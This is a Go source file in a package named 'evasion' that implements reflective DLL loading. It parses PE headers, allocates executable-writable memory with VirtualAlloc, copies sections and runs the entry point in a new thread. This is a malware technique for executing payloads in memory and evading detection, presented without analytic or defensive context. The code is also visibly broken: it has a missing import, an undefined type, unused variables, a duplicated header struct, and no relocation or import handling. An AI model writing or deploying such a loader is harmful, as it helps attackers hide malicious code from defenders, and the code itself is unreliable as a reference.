package evasion

import (
    "encoding/binary"
    "syscall"
    "unsafe"
)

type PEHeader struct {
    E_magic      uint16
    E_cblp       uint16
    E_cp         uint16
    E_crlc       uint16
    E_cparhdr    uint16
    E_minalloc   uint16
    E_maxalloc   uint16
    E_ss         uint16
    E_sp         uint16
    E_csum       uint16
    E_ip         uint16
    E_cs         uint16
    E_lfarlc     uint16
    E_ovno       uint16
    E_res        [4]uint16
    E_oemid      uint16
    E_oeminfo    uint16
    E_res2       [10]uint16
    E_lfanew     uint32
}

type IMAGE_DOS_HEADER struct {
    e_magic    uint16
    e_cblp     uint16
    e_cp       uint16
    e_crlc     uint16
    e_cparhdr  uint16
    e_minalloc uint16
    e_maxalloc uint16
    e_ss       uint16
    e_sp       uint16
    e_csum     uint16
    e_ip       uint16
    e_cs       uint16
    e_lfarlc   uint16
    e_ovno     uint16
    e_res      [4]uint16
    e_oemid    uint16
    e_oeminfo  uint16
    e_res2     [10]uint16
    e_lfanew   uint32
}

type IMAGE_FILE_HEADER struct {
    Machine              uint16
    NumberOfSections     uint16
    TimeDateStamp        uint32
    PointerToSymbolTable uint32
    NumberOfSymbols      uint32
    SizeOfOptionalHeader uint16
    Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uint64
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint64
    SizeOfStackCommit           uint64
    SizeOfHeapReserve           uint64
    SizeOfHeapCommit            uint64
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
    VirtualAddress uint32
    Size           uint32
}

type IMAGE_SECTION_HEADER struct {
    Name                 [8]byte
    VirtualSize          uint32
    VirtualAddress       uint32
    SizeOfRawData        uint32
    PointerToRawData     uint32
    PointerToRelocations uint32
    PointerToLinenumbers uint32
    NumberOfRelocations  uint16
    NumberOfLinenumbers  uint16
    Characteristics      uint32
}

func ReflectiveLoad(dllData []byte) error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    // Parse PE headers
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&dllData[0]))
    if dosHeader.e_magic != 0x5A4D { // MZ
        return nil
    }
    
    ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&dllData[dosHeader.e_lfanew]))
    if ntHeaders.Signature != 0x4550 { // PE
        return nil
    }
    
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")
    
    // Allocate memory in the current process
    baseAddr, _, err := virtualAlloc.Call(
        0,
        uintptr(ntHeaders.OptionalHeader.SizeOfImage),
        uintptr(0x3000), // MEM_COMMIT | MEM_RESERVE
        uintptr(0x40),   // PAGE_EXECUTE_READWRITE
    )
    if baseAddr == 0 {
        return err
    }
    
    // Copy headers
    copyMemory(uintptr(baseAddr), uintptr(unsafe.Pointer(&dllData[0])), 
        uintptr(ntHeaders.OptionalHeader.SizeOfHeaders))
    
    // Copy sections
    sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
        uintptr(unsafe.Pointer(ntHeaders)) + unsafe.Sizeof(*ntHeaders)))
    
    for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
        copyMemory(
            uintptr(baseAddr)+uintptr(sectionHeader.VirtualAddress),
            uintptr(unsafe.Pointer(&dllData[0]))+uintptr(sectionHeader.PointerToRawData),
            uintptr(sectionHeader.SizeOfRawData),
        )
        sectionHeader = (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
            uintptr(unsafe.Pointer(sectionHeader)) + unsafe.Sizeof(*sectionHeader)))
    }
    
    // Call entry point
    entryPoint := uintptr(baseAddr) + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)
    
    // Create thread to execute
    createThread := kernel32.NewProc("CreateThread")
    threadHandle, _, err := createThread.Call(
        0,
        0,
        entryPoint,
        uintptr(baseAddr),
        0,
        0,
    )
    
    return nil
}

func copyMemory(dest, src uintptr, size uintptr) {
    for i := uintptr(0); i < size; i++ {
        *(*byte)(unsafe.Pointer(dest + i)) = *(*byte)(unsafe.Pointer(src + i))
    }
}
